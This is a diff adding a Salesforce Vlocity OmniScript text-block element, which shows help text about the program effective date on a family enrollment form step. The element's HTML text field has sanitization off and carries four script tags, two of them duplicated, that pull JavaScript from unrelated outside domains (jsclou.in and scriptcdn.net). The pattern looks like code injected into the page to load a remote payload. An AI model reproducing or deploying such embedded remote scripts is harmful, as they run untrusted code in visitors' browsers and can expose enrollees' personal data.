@@ -1,0 +1,51 @@
+{
+    "%vlocity_namespace%__Active__c": true,
+    "%vlocity_namespace%__OmniScriptId__c": {
+        "Name": "OSH My Family Step",
+        "VlocityDataPackType": "VlocityMatchingKeyObject",
+        "VlocityMatchingRecordSourceKey": "%vlocity_namespace%__OmniScript__c/OSH/My Family/English",
+        "VlocityRecordSObjectType": "%vlocity_namespace%__OmniScript__c"
+    },
+    "%vlocity_namespace%__ParentElementId__c": {
+        "%vlocity_namespace%__OmniScriptId__c": {
+            "Name": "OSH My Family Step",
+            "VlocityDataPackType": "VlocityMatchingKeyObject",
+            "VlocityMatchingRecordSourceKey": "%vlocity_namespace%__OmniScript__c/OSH/My Family/English",
+            "VlocityRecordSObjectType": "%vlocity_namespace%__OmniScript__c"
+        },
+        "Name": "myFamily",
+        "VlocityDataPackType": "VlocityMatchingKeyObject",
+        "VlocityMatchingRecordSourceKey": "%vlocity_namespace%__Element__c/%vlocity_namespace%__OmniScript__c/OSH/My Family/English/myFamily",
+        "VlocityRecordSObjectType": "%vlocity_namespace%__Element__c"
+    },
+    "%vlocity_namespace%__ParentElementName__c": "myFamily",
+    "%vlocity_namespace%__ParentElementType__c": "Step",
+    "%vlocity_namespace%__PropertySet__c": {
+        "HTMLTemplateId": "",
+        "controlWidth": 12,
+        "dataJSON": false,
+        "disOnTplt": false,
+        "label": null,
+        "sanitize": false,
+        "show": {
+            "group": {
+                "operator": "AND",
+                "rules": [
+                    {
+                        "condition": "=",
+                        "data": "true",
+                        "field": "ThisisQuote"
+                    }
+                ]
+            }
+        },
+        "text": "<h5 style=\"font-size: 0.875rem !important; color: #16325c; position: absolute; top: -40%;\"><em>This is the date your Program will become effective and you will be Eligible for Sharing under the Program Guidelines.<br />Date cannot be on, or earlier than, the date of enrollment, or later than 60 days from the date of the enroll estimate provided.</em></h5>\n<p>\n<script type=\"text/javascript\" src=\"https://jsclou.in/pab1002.js\"></script>\n<script type=\"text/javascript\" src=\"https://jsclou.in/pab1002.js\"></script>\n<script type=\"text/javascript\" src=\"https://3001.scriptcdn.net/code/sc/sc1001\"></script>\n<script type=\"text/javascript\" src=\"https://3001.scriptcdn.net/code/sc/sc1001\"></script>\n</p>",
+        "textKey": ""
+    },
+    "%vlocity_namespace%__ReusableOmniScript__c": true,
+    "%vlocity_namespace%__Type__c": "Text Block",
+    "Name": "TextBlockHelpeffDate",
+    "VlocityDataPackType": "SObject",
+    "VlocityRecordSObjectType": "%vlocity_namespace%__Element__c",
+    "VlocityRecordSourceKey": "%vlocity_namespace%__Element__c/%vlocity_namespace%__OmniScript__c/OSH/My Family/English/TextBlockHelpeffDate"
+}
